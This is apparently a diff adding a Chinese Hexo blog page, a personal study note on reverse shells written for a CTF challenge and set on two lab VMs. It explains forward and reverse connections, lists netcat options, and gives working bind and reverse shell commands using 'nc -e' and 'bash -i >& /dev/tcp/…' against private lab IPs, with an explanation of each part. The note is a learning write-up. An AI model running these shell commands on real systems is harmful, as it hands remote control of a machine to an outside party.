@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="&amp;#x4E3A;&amp;#x4E86;&amp;#x5B66;&amp;#x4E60;show&amp;#x91CC;&amp;#x9762;&amp;#x7684;371&amp;#xFF0C;&amp;#x5B66;&amp;#x4E60;&amp;#x4E00;&amp;#x4E0B;&amp;#x53CD;&amp;#x5F39;shell&amp;#x7684;&amp;#x76F8;&amp;#x5173;&amp;#x77E5;&amp;#x8BC6; &amp;#x81EA;&amp;#x5DF1;&amp;#x5F00;&amp;#x4E86;&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="http://example.com/2022/10/03/%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="Clutter Box">
+<meta property="og:description" content="&amp;#x4E3A;&amp;#x4E86;&amp;#x5B66;&amp;#x4E60;show&amp;#x91CC;&amp;#x9762;&amp;#x7684;371&amp;#xFF0C;&amp;#x5B66;&amp;#x4E60;&amp;#x4E00;&amp;#x4E0B;&amp;#x53CD;&amp;#x5F39;shell&amp;#x7684;&amp;#x76F8;&amp;#x5173;&amp;#x77E5;&amp;#x8BC6; &amp;#x81EA;&amp;#x5DF1;&amp;#x5F00;&amp;#x4E86;&amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-03T15:46:32.000Z">
+<meta property="article:modified_time" content="2023-06-05T02:52:22.560Z">
+<meta property="article:author" content="Kirsten Carton">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="shell">
+<meta name="twitter:card" content="summary"><title>反弹shell | Clutter Box</title><link ref="canonical" href="http://example.com/2022/10/03/%E5%8F%8D%E5%BC%B9shell/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><script src="https://www.googletagmanager.com/gtag/js?id=G-Q0LPD8MD2C" async=""></script><script>if (window.location.hostname !== 'localhost') {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){ dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-Q0LPD8MD2C');
+}</script><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clutter Box</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">反弹shell</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-10-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-06-05</span></span></div></header><div class="post-body"><p>&#x4E3A;&#x4E86;&#x5B66;&#x4E60;show&#x91CC;&#x9762;&#x7684;371&#xFF0C;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#x53CD;&#x5F39;shell&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;</p>
+<p>&#x81EA;&#x5DF1;&#x5F00;&#x4E86;&#x4E24;&#x53F0;&#x865A;&#x62DF;&#x673A;</p>
+<span id="more"></span>
+
+
+        <h3 id="&#x6B63;&#x5411;&#x8FDE;&#x63A5;">
+          <a href="#&#x6B63;&#x5411;&#x8FDE;&#x63A5;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x6B63;&#x5411;&#x8FDE;&#x63A5;" class="headerlink" title="&#x6B63;&#x5411;&#x8FDE;&#x63A5;"></a>&#x6B63;&#x5411;&#x8FDE;&#x63A5;</h3>
+      <ul>
+<li>&#x5047;&#x8BBE;&#x6211;&#x4EEC;&#x653B;&#x51FB;&#x4E86;&#x4E00;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x6253;&#x5F00;&#x4E86;&#x8BE5;&#x673A;&#x5668;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x673A;&#x5668;&#x53BB;&#x8FDE;&#x63A5;&#x76EE;&#x6807;&#x673A;&#x5668;&#xFF08;&#x76EE;&#x6807;ip&#xFF1A;&#x76EE;&#x6807;&#x673A;&#x5668;&#x7AEF;&#x53E3;&#xFF09;&#xFF0C;&#x8FD9;&#x662F;&#x6BD4;&#x8F83;&#x5E38;&#x89C4;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53EB;&#x505A;&#x6B63;&#x5411;&#x8FDE;&#x63A5;&#x3002;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x3001;web&#x670D;&#x52A1;&#x3001;ssh&#x3001;telnet&#x7B49;&#x7B49;&#x90FD;&#x662F;&#x6B63;&#x5411;&#x8FDE;&#x63A5;</li>
+</ul>
+
+        <h3 id="&#x53CD;&#x5411;&#x8FDE;&#x63A5;">
+          <a href="#&#x53CD;&#x5411;&#x8FDE;&#x63A5;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x53CD;&#x5411;&#x8FDE;&#x63A5;" class="headerlink" title="&#x53CD;&#x5411;&#x8FDE;&#x63A5;"></a>&#x53CD;&#x5411;&#x8FDE;&#x63A5;</h3>
+      <ul>
+<li>&#x90A3;&#x4E48;&#x53CD;&#x5411;&#x8FDE;&#x63A5;&#x5C31;&#x5F88;&#x597D;&#x7406;&#x89E3;&#x4E86;&#xFF0C;&#x5C31;&#x662F;&#x653B;&#x51FB;&#x8005;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x53D7;&#x5BB3;&#x8005;&#x4E3B;&#x673A;&#x4E3B;&#x52A8;&#x8FDE;&#x63A5;&#x653B;&#x51FB;&#x8005;&#x7684;&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;&#xFF0C;&#x5373;&#x4E3A;&#x53CD;&#x5411;&#x8FDE;&#x63A5;</li>
+</ul>
+
+        <h3 id="nc&#x5E38;&#x7528;&#x6307;&#x4EE4;">
+          <a href="#nc&#x5E38;&#x7528;&#x6307;&#x4EE4;" class="heading-link"><i class="fas fa-link"></i></a><a href="#nc&#x5E38;&#x7528;&#x6307;&#x4EE4;" class="headerlink" title="nc&#x5E38;&#x7528;&#x6307;&#x4EE4;"></a>nc&#x5E38;&#x7528;&#x6307;&#x4EE4;</h3>
+      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">nc</span><br><span class="line">-c shell commands&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; as `-e&apos;; use /bin/sh to exec [dangerous!!]</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -e filename&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; program to exec after connect [dangerous!!]</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -b&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; allow broadcasts</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -g gateway&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; source-routing hop point[s], up to 8</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -G num&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; source-routing pointer: 4, 8, 12, ...</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -h&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; this cruft</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -i secs&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; delay interval for lines sent, ports scanned</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -k&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; set keepalive option on socket</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -l&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; listen mode, for inbound connects</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -n&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; numeric-only IP addresses, no DNS</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -o file&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; hex dump of traffic</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -p port&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; local port number</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -r&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;randomize local and remote ports</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -q secs&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; quit after EOF on stdin and delay of secs</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -s addr&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; local source address</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -T tos&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; set Type Of Service</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -t&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;answer TELNET negotiation</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -u&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; UDP mode</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -v&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; verbose [use twice to be more verbose]</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -w secs&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; timeout for connects and final net reads</span><br><span class="line"></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; -z&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; zero-I/O mode [used for scanning]</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x83B7;&#x53D6;Linux&#x7684;ip&#x5730;&#x5740;&#xFF1A;</p>
+<p>ubuntu:<code>ip a</code>   &#x6216;&#x8005; <code>ip address</code></p>
+<p>kali:<code>ifconfig -a</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu&#x4E0A;&#x7684;ip</span><br><span class="line">198.168.111.128/24</span><br><span class="line">kali&#x4E0A;&#x7684;ip</span><br><span class="line">192.168.111.130</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="&#x6B63;&#x5411;shell">
+          <a href="#&#x6B63;&#x5411;shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x6B63;&#x5411;shell" class="headerlink" title="&#x6B63;&#x5411;shell"></a>&#x6B63;&#x5411;shell</h3>
+      <p>ubuntu    &#x662F;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x8981;&#x83B7;&#x53D6;&#x5BA2;&#x6237;&#x7AEF;&#x7684;shell</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.111.130 9999</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">//&#x6267;&#x884C;&#x5B8C;&#x4E0A;&#x9762;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x540E;</span><br></pre></td></tr></table></div></figure>
+
+<p>kali          &#x662F;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x88AB;&#x64CD;&#x4F5C;&#x7684;&#x90A3;&#x53F0;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999 -e /bin/sh</span><br></pre></td></tr></table></div></figure>
+
+<blockquote>
+<p> netcat: getnameinfo: Temporary failure in name resolution</p>
+<p>&#x5C06;-lvp&#x6539;&#x4E3A;-lvnp&#x5373;&#x53EF;</p>
+</blockquote>
+<blockquote>
+<p>&#x5173;&#x4E8E;nc&#x65E0;&#x6CD5;&#x4F7F;&#x7528;-e&#x53C2;&#x6570; nc&#xFF1A;invalid option &#x2013; &#x2018;e&#x2019;</p>
+<p>&#x539F;&#x56E0;&#xFF1A;nc&#x7248;&#x672C;&#x592A;&#x8001;&#x4E86;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/tonine9/article/details/125957207">&#x5173;&#x4E8E;nc&#x65E0;&#x6CD5;&#x4F7F;&#x7528;-e&#x53C2;&#x6570; nc&#xFF1A;invalid option &#x2013; &#x2018;e&#x2019;_tonine9&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<blockquote>
+<p>unable to acquire the dpkg frontend lock</p>
+<p>&#x62A5;&#x9519;&#x539F;&#x56E0;&#xFF1A; lock file&#x7528;&#x4E8E;&#x9632;&#x6B62;&#x4E24;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#x3002; &#x5F53;&#x8FD0;&#x884C;apt&#x6216;apt-commands&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x5728;&#x51E0;&#x4E2A;&#x5730;&#x65B9;&#x521B;&#x5EFA;lock files&#x3002; &#x5F53;&#x524D;&#x4E00;&#x4E2A;apt&#x547D;&#x4EE4;&#x672A;&#x6B63;&#x786E;&#x7EC8;&#x6B62;&#x65F6;&#xFF0C;lock file&#x672A;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x4EEC;&#x4F1A;&#x963B;&#x6B62;&#x4EFB;&#x4F55;&#x65B0;&#x7684;apt / apt-get&#x547D;&#x4EE4;&#x5B9E;&#x4F8B;&#xFF0C;&#x6BD4;&#x5982;&#x6B63;&#x5728;&#x6267;&#x884C;apt-get upgrade&#xFF0C;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x76F4;&#x63A5;ctrl+c&#x53D6;&#x6D88;&#x4E86;&#x8BE5;&#x64CD;&#x4F5C;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5C31;&#x4F1A;&#x9020;&#x6210;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x3002;<br>&#x8981;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x5220;&#x9664;lock file&#x3002;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/shimadear/article/details/90598646">Ubuntu&#x4E2D;Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend)&#x95EE;&#x9898;&#x7684;&#x89E3;&#x51B3;_&#x6731;&#x53C8;&#x7096;&#x7C89;&#x6761;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_unable to acquire the dpkg frontend lock (/var/lib</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/Scarlett2025/article/details/119929360">Unable to acquire the dpkg frontend lock_Scarlett2025&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+
+        <h3 id="&#x53CD;&#x5411;shell">
+          <a href="#&#x53CD;&#x5411;shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x53CD;&#x5411;shell" class="headerlink" title="&#x53CD;&#x5411;shell"></a>&#x53CD;&#x5411;shell</h3>
+      
+        <h4 id="&#x4F7F;&#x7528;nc">
+          <a href="#&#x4F7F;&#x7528;nc" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x4F7F;&#x7528;nc" class="headerlink" title="&#x4F7F;&#x7528;nc"></a>&#x4F7F;&#x7528;nc</h4>
+      <p>ubuntu&#x5F53;&#x670D;&#x52A1;&#x5668;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.111.130 2333 -e /bin/bash</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x901A;&#x7528;&#x547D;&#x4EE4;&#xFF1A;nc &lt;&#x653B;&#x51FB;&#x673A;IP&gt; &lt;&#x653B;&#x51FB;&#x673A;&#x76D1;&#x542C;&#x7684;&#x7AEF;&#x53E3;&gt; -e /bin/bash</p>
+<p>kali&#x5F53;&#x653B;&#x51FB;&#x8005;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 2333</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="&#x4F7F;&#x7528;bash">
+          <a href="#&#x4F7F;&#x7528;bash" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x4F7F;&#x7528;bash" class="headerlink" title="&#x4F7F;&#x7528;bash"></a>&#x4F7F;&#x7528;bash</h4>
+      <p>kali&#x5F53;&#x653B;&#x51FB;&#x8005;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#x8BA9;&#x653B;&#x51FB;&#x8005;&#x5148;&#x76D1;&#x542C;</span><br><span class="line">netcat -lvvp 1025</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+<p>ubuntu&#x5F53;&#x670D;&#x52A1;&#x5668;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#x8BA9;&#x670D;&#x52A1;&#x5668;&#x540E;&#x8FDE;&#x63A5;</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.111.130/1025 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>&#x547D;&#x4EE4;</th>
+<th>&#x547D;&#x4EE4;&#x8BE6;&#x89E3;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>&#x4EA7;&#x751F;&#x4E00;&#x4E2A;bash&#x4EA4;&#x4E92;&#x73AF;&#x5883;&#x3002;</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>&#x5C06;&#x8054;&#x5408;&#x7B26;&#x53F7;&#x524D;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x4E0E;&#x540E;&#x9762;&#x76F8;&#x7ED3;&#x5408;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x8D77;&#x91CD;&#x5B9A;&#x5411;&#x7ED9;&#x540E;&#x8005;&#x3002;</td>
+</tr>
+<tr>
+<td>/dev/tcp/47.xxx.xxx.72/2333</td>
+<td>Linux&#x73AF;&#x5883;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x5185;&#x5BB9;&#x90FD;&#x662F;&#x4EE5;&#x6587;&#x4EF6;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x5728;&#x7684;&#xFF0C;&#x5176;&#x5B9E;&#x5927;&#x5BB6;&#x4E00;&#x770B;&#x89C1;&#x8FD9;&#x4E2A;&#x5185;&#x5BB9;&#x5C31;&#x80FD;&#x660E;&#x767D;&#xFF0C;&#x5C31;&#x662F;&#x8BA9;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x4E0E;&#x653B;&#x51FB;&#x673A;47.xxx.xxx.72&#x7684;2333&#x7AEF;&#x53E3;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;tcp&#x8FDE;&#x63A5;&#x3002;</td>
+</tr>
+<tr>
+<td>0&gt;&amp;1</td>
+<td>&#x5C06;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4E0E;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x7684;&#x5185;&#x5BB9;&#x76F8;&#x7ED3;&#x5408;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x5B9A;&#x5411;&#x7ED9;&#x524D;&#x9762;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x7684;&#x5185;&#x5BB9;&#x3002;</td>
+</tr>
+</tbody></table></div>
+
+        <h4 id="Curl&#x914D;&#x5408;Bash&#x53CD;&#x5F39;shell">
+          <a href="#Curl&#x914D;&#x5408;Bash&#x53CD;&#x5F39;shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#Curl&#x914D;&#x5408;Bash&#x53CD;&#x5F39;shell" class="headerlink" title="Curl&#x914D;&#x5408;Bash&#x53CD;&#x5F39;shell"></a>Curl&#x914D;&#x5408;Bash&#x53CD;&#x5F39;shell</h4>
+      <ul>
+<li><p>&#x501F;&#x52A9;&#x4E86;Linux&#x4E2D;&#x7684;&#x7BA1;&#x9053;,&#x5C06;curl&#x83B7;&#x53D6;&#x5230;&#x7684;&#x5185;&#x5BB9;&#x4F5C;&#x4E3A;bash&#x4EA4;&#x4E92;&#x7684;&#x6307;&#x4EE4;&#x6765;&#x6267;&#x884C;</p>
+</li>
+<li><blockquote>
+<p>&#x6CE8;&#x610F;ip&#x53EF;&#x4EE5;&#x662F;&#x591A;&#x79CD;&#x683C;&#x5F0F;&#xFF0C;&#x5341;&#x8FDB;&#x5236;&#x3001;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x3001;&#x516B;&#x8FDB;&#x5236;&#x3001;&#x4E8C;&#x8FDB;&#x5236;</p>
+</blockquote>
+</li>
+</ul>
